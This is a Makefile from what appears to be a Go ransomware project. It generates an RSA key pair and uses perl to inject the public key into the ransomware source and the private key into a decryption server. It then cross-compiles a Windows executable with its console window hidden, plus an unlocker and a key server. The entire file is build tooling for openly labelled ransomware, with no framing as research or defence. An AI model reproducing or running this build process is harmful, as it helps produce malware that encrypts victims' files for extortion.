.PHONY: all

all: build clean

pre-build:
	mkdir -p build
	mkdir -p build/ransomware
	openssl genrsa -out build/private.pem 2048
	openssl rsa -in build/private.pem -outform PEM -pubout -out build/ransomware/public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o build/ransomware/ransomware.syso
	cp -r cmd/ransomware ./build
	cp cmd/unlocker/unlocker.go ./build
	cd build/ransomware && perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
	cd build && perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' ../server/main.go
	mkdir -p bin

ransomware:
	cd build/ransomware && env GOOS=windows go build -ldflags "-H windowsgui" && mv ransomware.exe ../../bin
	cd build && env GOOS=windows go build unlocker.go && mv unlocker.exe ../bin
	cd server && go build && mv `ls|grep server` ../bin

build: pre-build ransomware

clean:
	rm -r build
	mv server/main.go.bak server/main.go
